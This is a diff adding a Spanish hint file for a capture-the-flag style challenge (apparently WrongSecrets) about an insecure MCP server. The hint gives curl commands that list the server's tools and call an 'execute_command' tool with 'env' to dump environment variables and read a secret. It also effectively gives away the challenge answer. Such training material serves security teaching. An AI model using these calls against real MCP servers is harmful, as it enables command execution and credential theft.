@@ -1,0 +1,37 @@
+=== Pista para el desafío 60
+
+Este desafío demuestra cómo un servidor MCP (Protocolo de Contexto de Modelo) inseguro puede filtrar información secreta almacenada en variables de entorno.
+
+**Dónde buscar:**
+
+1. **Un servidor MCP independiente se está ejecutando en el puerto 8090**, distinto del puerto de la aplicación principal (8080).
+2. **El servidor MCP implementa el protocolo JSON-RPC 2.0** tal como lo define la especificación MCP.
+3. **Comience por listar las herramientas disponibles** utilizando el método `tools/list`.
+4. **Llama a la herramienta `execute_command`** — te devolverá las variables de entorno del servidor.
+
+**Enfoque paso a paso:**
+
+En primer lugar, enumere las herramientas que ofrece el servidor MCP:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+Luego, llama a `execute_command` con cualquier comando de shell (como `env`):
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
+**Qué buscar:**
+
+- Busque la clave `WRONGSECRETS_MCP_SECRET` en el volcado de variables de entorno devuelto.
+- El valor que aparece al lado es la respuesta a este desafío.
+
+**Recuerda:** El punto final también es accesible en el puerto principal; prueba con `/mcp` si el puerto 8090 no es accesible.
